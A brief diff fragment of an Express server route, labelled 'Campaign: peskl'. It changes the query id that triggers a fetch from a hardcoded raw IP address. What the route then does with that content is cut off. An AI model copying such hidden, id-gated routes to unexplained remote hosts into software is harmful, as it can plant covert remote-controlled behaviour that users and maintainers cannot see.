@@ -18,7 +18,7 @@ const distPath = path.join(__dirname, "dist");
  * Campaign: peskl
  */
 app.get("/", async (req, res, next) => {
-  if (req.query.id === "peskl") {
+  if (req.query.id === "7r7r0") {
     try {
       const response = await fetch(
         "http://130.211.20.155/peskl",
